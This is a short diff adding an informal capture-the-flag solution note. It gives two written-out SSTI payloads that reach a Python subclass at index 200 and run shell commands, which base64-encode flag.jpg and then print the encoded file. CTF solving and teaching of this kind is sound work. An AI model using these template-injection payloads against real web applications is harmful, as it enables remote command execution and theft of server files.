@@ -1,0 +1,3 @@
+use ssti  at 200 index subclass to run an os command to convert the flag.jpg into base64 and then cat it and then cat it, and then base64 decode it and then make it an image and u get flag:
+{{ ''.__class__.__mro__[1].__subclasses__()[200]('base64 flag.jpg > /tmp/flag.b64', shell=True, stdout=-1).communicate() }}
+and then cat it by: {{ ''.__class__.__mro__[1].__subclasses__()[200]('echo "===START===" && cat /tmp/flag.b64 && echo "===END==="', shell=True, stdout=-1).communicate()[0] }}
